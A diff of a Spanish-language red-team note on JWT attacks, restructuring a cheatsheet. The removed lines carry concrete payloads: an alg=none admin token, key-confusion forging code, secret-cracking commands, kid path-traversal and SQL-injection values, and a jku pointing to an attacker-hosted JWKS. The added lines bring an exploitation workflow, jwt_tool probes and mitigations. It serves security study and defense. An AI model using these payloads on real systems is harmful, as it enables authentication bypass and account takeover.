@@ -3,205 +3,284 @@ aliases:
   - JSON Web Token Attacks
   - JWT Abuse
   - JWT Tampering
+  - JWT Exploitation
 tags:
-  - type/atomic
+  - type/vulnerability
+  - vuln/jwt
   - vuln/auth-bypass
   - technique/credential-access
+  - technique/privilege-escalation
   - asset/web-app
   - cred/jwt
 primary categories:
-  - "[[Red Team]]"
+  - '[[Red Team]]'
 secondary categories:
-  - "[[Explotación]]"
+  - '[[Explotación|Explotación]]'
 tertiary categories:
-  - "[[Explotación Web]]"
-type: Atomic
+  - '[[Explotación Web]]'
+type: CheatSheet
 linked:
-  - "[[Authentication & Authorization Bypass]]"
-  - "[[Cookies y Sesiones]]"
+  - '[[JWT - Deteccion y Reconocimiento]]'
+  - '[[JWT - Ataques al Algoritmo]]'
+  - '[[JWT - Inyeccion en Headers]]'
+  - '[[JWT - Manipulacion de Claims]]'
+  - '[[JWT - Tooling y Brute Force]]'
+  - '[[Authentication & Authorization Bypass]]'
+  - '[[Cookies y Sesiones]]'
+  - '[[Burp Suite]]'
 ---
 # JWT Attacks
 
 ***
 
 ## Cheatsheet
-^jwt-attacks
 
-| Ataque | Requisito | Técnica | Tool |
-| --- | --- | --- | --- |
-| **`alg: none`** | Backend acepta `none` | Cambiar header, vaciar signature | `jwt_tool -X a` |
-| **Key confusion RS256→HS256** | Pub key leakeada/obtenible | Firmar HS256 usando pub key como secret | `jwt_tool -X k -pk pub.pem` |
-| **Weak HS256 secret** | Secret corto/común | Crackear offline | `hashcat -m 16500`, `john --format=HMAC-SHA256` |
-| **`kid` path traversal** | `kid` no sanitizado | Apuntar a archivo conocido (`/dev/null`, uploadeado) | `jwt_tool -X i` |
-| **`kid` SQLi** | `kid` usa query SQL | UNION select secret | Manual |
-| **`jwk` header injection** | Backend confía `jwk` | Inyectar pub key propia | `jwt_tool -X s` |
-| **`jku` header injection** | Backend fetch `jku` URL | Apuntar a JWKS propio | `jwt_tool -X u` |
-| **`x5u` / `x5c` injection** | Backend valida cert inline | Self-signed cert propio | Manual |
-| **Algorithm substitution** | Validación débil | Downgrade a algoritmo inseguro | `jwt_tool -T` |
-| **Token expiration / replay** | Sin `jti` o corto TTL | Reusar token capturado | `curl` |
-| **Sensitive data in payload** | Info en claims | Decodear, leer | `jwt.io` |
+### 🔍 Detección y Reconocimiento
 
-***
+````tabs
+tab: **Identificación en Request**
+![[JWT - Deteccion y Reconocimiento#^jwt-detect-request]]
 
-## Estructura
+tab: **Decodificación y Análisis**
+![[JWT - Deteccion y Reconocimiento#^jwt-detect-decode]]
+````
+
+### 🔓 Ataques al Algoritmo
+
+````tabs
+tab: **alg=none Bypass**
+![[JWT - Ataques al Algoritmo#^jwt-alg-none]]
+
+tab: **Algorithm Confusion (HS256 ↔ RS256)**
+![[JWT - Ataques al Algoritmo#^jwt-alg-confusion]]
+
+tab: **Weak Secret Bruteforce**
+![[JWT - Ataques al Algoritmo#^jwt-alg-bruteforce]]
+````
+
+### 🔑 Inyección en Headers (Key Confusion)
+
+````tabs
+tab: **kid SQL Injection**
+![[JWT - Inyeccion en Headers#^jwt-key-kid-sqli]]
+
+tab: **kid Path Traversal**
+![[JWT - Inyeccion en Headers#^jwt-key-kid-path]]
+
+tab: **jku Header Injection**
+![[JWT - Inyeccion en Headers#^jwt-key-jku]]
+
+tab: **jwk Header Injection**
+![[JWT - Inyeccion en Headers#^jwt-key-jwk]]
+
+tab: **x5u / x5c Injection**
+![[JWT - Inyeccion en Headers#^jwt-key-x5u]]
+````
+
+### 🎯 Manipulación de Claims
+
+````tabs
+tab: **Privilege Escalation**
+![[JWT - Manipulacion de Claims#^jwt-claims-privesc]]
+
+tab: **Account Takeover**
+![[JWT - Manipulacion de Claims#^jwt-claims-takeover]]
+
+tab: **Bypass Temporal (exp/nbf/iat)**
+![[JWT - Manipulacion de Claims#^jwt-claims-temporal]]
+
+tab: **Bypass iss / aud**
+![[JWT - Manipulacion de Claims#^jwt-claims-iss-aud]]
+````
+
+### 🛠️ Tooling y Brute Force
+
+````tabs
+tab: **jwt_tool (All-in-One)**
+![[JWT - Tooling y Brute Force#^jwt-tool-jwttool]]
+
+tab: **Hashcat HS256**
+![[JWT - Tooling y Brute Force#^jwt-tool-hashcat]]
+
+tab: **jwtcrack y John**
+![[JWT - Tooling y Brute Force#^jwt-tool-jwtcrack]]
+````
+
+___
+
+## Overview
+
+**JSON Web Token (JWT)** = formato de token compacto firmado/cifrado para auth stateless. Estructura: `header.payload.signature` en base64url. Backends modernos (Node, Spring, Django REST, .NET, Go) lo usan como bearer token reemplazando sesiones server-side.
+
+**Por qué JWT es target frecuente:**
+- Backends a menudo confían en el contenido del token sin validar bien la firma.
+- Implementaciones de libs históricamente buggy (alg=none default, key confusion).
+- Headers `kid` / `jku` / `jwk` permiten controlar parcialmente cómo se valida — vector directo.
+- Secrets HS256 débiles son comunes en deploys (`secret`, `change-me`, hardcoded).
+
+### Estructura JWT
 
 ```
-header.payload.signature
+xxxxxxxxxxx.yyyyyyyyyyy.zzzzzzzzzzz
+    HEADER     PAYLOAD    SIGNATURE
 ```
 
-Cada parte: `base64url(JSON)`. Signature cubre `base64url(header) + "." + base64url(payload)`.
+| Parte | Contenido |
+|---|---|
+| **Header** | `{"alg":"HS256","typ":"JWT","kid":"...","jku":"...","jwk":{...}}` |
+| **Payload** | Claims: `sub`, `iss`, `aud`, `exp`, `iat`, `nbf`, + custom (`role`, `user_id`, etc) |
+| **Signature** | HMAC(header.payload, secret) o RSA-Sign(header.payload, priv_key) |
+
+### Algoritmos comunes
+
+| Alg | Tipo | Vector primario |
+|---|---|---|
+| `HS256` / `HS384` / `HS512` | Symmetric (HMAC) | Bruteforce secret, alg confusion |
+| `RS256` / `RS384` / `RS512` | Asymmetric (RSA) | Key confusion, jku/jwk inject |
+| `ES256` / `ES384` / `ES512` | Asymmetric (ECDSA) | Nonce reuse, key confusion |
+| `EdDSA` | Asymmetric (Ed25519) | Mismo que ES* |
+| `none` | Sin firma | alg=none bypass directo |
+
+### Libs históricamente vulnerables
+
+| Lib | CVE | Vector |
+|---|---|---|
+| `jsonwebtoken` (Node) | CVE-2015-9235 | alg=none default |
+| `python-jose` | CVE-2016-10555 | Key confusion HS/RS |
+| `pyjwt` < 1.5 | — | alg=none acepta |
+| `auth0/jwks-rsa` | CVE-2018-0114 | jku no valida origen |
+| `node-jsonwebtoken` (Auth0) | CVE-2022-23529 | RCE via verify() con keyType inválido |
+
+___
+
+## Workflow de explotación
+
+```
+1. Identificar JWT en request (Authorization, Cookie, body, storage).
+2. Decodificar header + payload (sin verificar firma).
+3. Identificar:
+   - alg (HS256 / RS256 / none)
+   - kid / jku / jwk / x5u en header
+   - claims sensibles en payload (role, sub, exp, iss, aud)
+4. Probar ataques en orden de menor esfuerzo:
+   a. alg=none
+   b. Algorithm confusion RS256→HS256 (si tenés pública)
+   c. Bruteforce HS256 (si secret corto)
+   d. kid SQLi / path traversal (si kid presente)
+   e. jku / jwk / x5u inject (si headers presentes)
+5. Modificar claims target (privilege escalation / takeover).
+6. Re-firmar con secret/key derivado.
+7. Validar autenticado al endpoint privilegiado.
+```
+
+___
+
+## Detección rápida
+
+### Indicadores en código backend
+
+- Llamadas a `jwt.decode()` sin pasar `algorithms=['HS256']` (acepta cualquier alg).
+- Endpoint `/.well-known/jwks.json` o `/.well-known/openid-configuration`.
+- Backend hace HTTP fetch a URL del header (`jku`, `x5u`).
+- Lookup en DB por `kid` sin parametrizar (SQLi).
+- File read por `kid` sin sanitizar (path traversal).
+
+### Probes mínimos
 
 ```bash
-echo -n "eyJhbGci..." | cut -d. -f1 | base64 -d
+# 1. Detectar JWT en historial Burp
+grep -E 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' burp.log
+
+# 2. Decodear rápido
+TOKEN="eyJhbGciOi..."
+echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq
+echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq
+
+# 3. Probe alg=none
+python3 jwt_tool.py $TOKEN -X a
+
+# 4. Probe playbook completo
+python3 jwt_tool.py $TOKEN -M pb -t https://target/api/profile -rh "Authorization: Bearer $TOKEN"
 ```
 
-## 1. `alg: none`
-
-```json
-{"alg":"none","typ":"JWT"}
-{"sub":"admin","role":"admin"}
-```
-
-Signature vacía (`header.payload.`). Variantes: `None`, `NONE`, `nOnE` (case bypass).
+### Tooling
 
 ```bash
-jwt_tool eyJ... -X a
+# jwt_tool — análisis + exploit
+git clone https://github.com/ticarpi/jwt_tool
+
+# Burp extensions
+# - JSON Web Tokens (Burp store)
+# - JWT Editor (Burp store)
+
+# CLI alternativas
+npm install -g jwt-cli              # decode + sign rápido
+pip install pyjwt                   # forge programático
 ```
 
-## 2. Key confusion RS256→HS256
+___
 
-Algoritmo RSA → HMAC: server usa misma key. Atacante obtiene pub key → firma HS256 usando pub key como secret.
+## Impacto
 
-```bash
-# Descargar pub key
-openssl s_client -connect victim:443 | openssl x509 -pubkey -noout > pub.pem
+- **Account takeover** — forge token impersonando otro user vía claim manipulation.
+- **Privilege escalation** — `role:user` → `role:admin` con re-firma.
+- **Auth bypass total** — alg=none / weak secret / key confusion permite forge sin saber secret.
+- **Persistencia** — extender `exp` a años en el futuro.
+- **Lateral entre tenants** — multi-tenant apps con `tenant_id` en payload.
+- **SSRF** — `jku` / `x5u` apuntando a interno fetcha URL del backend.
+- **RCE** — combinado con vulns en lib (CVE-2022-23529 en jsonwebtoken).
 
-# Forjar con jwt_tool
-jwt_tool eyJ... -X k -pk pub.pem
-```
+___
 
-Manual:
-```python
-import jwt
-pub = open('pub.pem').read()
-token = jwt.encode({"sub":"admin"}, pub, algorithm="HS256")
-```
+## Mitigación (defender)
 
-## 3. Weak secret cracking
+- **Whitelist de algoritmos**: `jwt.verify(token, key, {algorithms: ['RS256']})` — nunca aceptar `none` o lista vacía.
+- **Validar issuer y audience**: `iss` y `aud` con string match exacto contra trusted list.
+- **Validar firma contra clave correcta**: si esperás RS256, NO usar pública como secret HMAC.
+- **No confiar en `jku` / `x5u` controlados por user**: hardcodear URL JWKS o whitelistear hosts.
+- **Validar `kid` como ID opaco**: parametrizar query DB, NO concatenar; NO usar `kid` como path.
+- **Secret HS256 ≥ 32 bytes random**: no defaults, no hardcoded, rotar periódicamente.
+- **`exp` corto** (15-60 min) + refresh tokens stateful en DB.
+- **`jti` con tracking**: blacklist tokens revocados.
+- **Clock skew tolerance ≤ 60s**.
+- **No firmar y cifrar con la misma key**: separar.
 
-```bash
-# Hashcat
-hashcat -m 16500 token.txt rockyou.txt
+___
 
-# John
-echo "eyJ..." > jwt.txt
-john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
-```
+## Para entender JWT
 
-Secretos comunes: `secret`, `your-256-bit-secret`, nombre app, JWT_SECRET env leaked.
+**JWT vs sessions tradicionales:**
 
-## 4. `kid` injection
+| | **Session cookie** | **JWT** |
+|---|---|---|
+| Estado | Server-side (DB / Redis) | Cliente (token autocontenido) |
+| Revocación | Borrar de DB | Esperar `exp` o blacklist (jti) |
+| Tamaño | ~40 bytes | 200-2000 bytes |
+| Validación | Lookup en store | Verify firma local |
+| Vector | Session hijack / fixation | Forge / tamper / weak secret |
 
-Header:
-```json
-{"alg":"HS256","kid":"../../../../../dev/null"}
-```
+**Por qué fallan tanto:**
 
-Con `/dev/null` como key → HS256 con secret vacío:
-```python
-jwt.encode(payload, "", algorithm="HS256")
-```
+1. **Confianza en el contenido** — devs olvidan que `payload` es **base64, no encriptado**. Quien tiene el token lo lee.
+2. **Confianza en `alg`** — algunos libs eligen método de validación según `alg` declarado. Atacante controla `alg`.
+3. **Confianza en headers** — `kid`/`jku`/`jwk` son atributos del token. Backend que los usa sin validar = forge.
+4. **Defaults inseguros históricos** — versiones viejas de libs con `alg=none` enabled by default.
 
-Path traversal a archivo conocido/uploadeable:
-```json
-{"kid":"../../../tmp/uploaded.txt"}
-```
+**JWT vs JWE:**
+- JWT firmado (JWS) — contenido visible, firma protege integridad.
+- JWE encriptado — contenido cifrado. Mucho menos común. No confundir.
 
-SQLi en `kid`:
-```
-{"kid":"x' UNION SELECT 'attacker_secret' -- -"}
-```
-
-## 5. `jwk` header injection
-
-Atacante embebe su propia pub key en el header:
-```json
-{
-  "alg": "RS256",
-  "jwk": {
-    "kty": "RSA",
-    "n": "...attacker pub n...",
-    "e": "AQAB"
-  }
-}
-```
-
-Server confía el `jwk` embebido → verifica con clave del atacante.
-
-```bash
-jwt_tool eyJ... -X s
-```
-
-## 6. `jku` / `x5u` URL injection
-
-```json
-{"alg":"RS256","jku":"https://attacker.tld/jwks.json"}
-```
-
-Hostear JWKS con pub key propia. Bypass filtros:
-- `https://victim.tld@attacker.tld/jwks.json`
-- `https://victim.tld#@attacker.tld/jwks.json`
-- SSRF chain si hay whitelist.
-
-## 7. Algorithm substitution / downgrade
-
-Algunos libs aceptan header opcional o default a algoritmo débil si falta validación estricta de `alg`.
-
-```bash
-jwt_tool eyJ... -T  # tampering interactivo
-```
-
-## 8. Token capture + replay
-
-- Tokens sin `exp` / `iat` / `jti` → válidos para siempre.
-- Tokens con TTL largo (>24h) → window de replay grande.
-- Sin revocation list → logout no invalida token.
-
-***
-
-## Tools
-
-- **jwt_tool** (`ticarpi/jwt_tool`) — swiss-army, todos los ataques.
-- **jwt.io** — decode + verify online (cuidado con tokens reales).
-- **hashcat** `-m 16500` — JWT HS256 crack.
-- **jwt-cracker** (`lmammino/jwt-cracker`) — brute específico.
-- **Burp JWT Editor** extension — firma/edición inline en Repeater.
-- **python-jose** / **PyJWT** — manipulación custom.
-
-## Detección
-
-```bash
-# Localizar tokens
-grep -rE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' /path
-
-# Decodear rápido
-python3 -c "import sys,base64,json; h,p,_=sys.argv[1].split('.'); print(json.dumps(json.loads(base64.urlsafe_b64decode(p+'==')), indent=2))" "eyJ..."
-```
-
-## Prevención
-
-- Whitelist explícita de `alg`. Rechazar `none` siempre.
-- Secret HS256 >= 256 bits random.
-- Validar `iss`, `aud`, `exp`, `nbf`, `iat`.
-- `kid` sanitizado (no path traversal, no SQLi).
-- Rechazar `jwk`, `jku`, `x5u` en header salvo caso de uso específico con URL whitelist estricta.
-- Short TTL + refresh tokens + revocation list.
-- No meter datos sensibles en payload (es base64, no encriptación).
+___
 
 ## Recursos
 
-- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt)
-- [jwt_tool wiki](https://github.com/ticarpi/jwt_tool/wiki)
-- [HackTricks - JWT](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
+- [PortSwigger - JWT Attacks](https://portswigger.net/web-security/jwt) — labs y conceptos.
+- [PayloadsAllTheThings - JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token) — payloads.
+- [HackTricks - JWT](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) — referencia exhaustiva.
+- [jwt_tool wiki](https://github.com/ticarpi/jwt_tool/wiki) — docs oficial de la herramienta.
+- [RFC 7519 - JWT](https://datatracker.ietf.org/doc/html/rfc7519) — spec original.
+- [RFC 8725 - JWT BCP](https://datatracker.ietf.org/doc/html/rfc8725) — best current practices.
+- [Auth0 - JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook) — guía completa.
+- [jwt.io](https://jwt.io) — debugger online + libs por lenguaje.
 
 ***
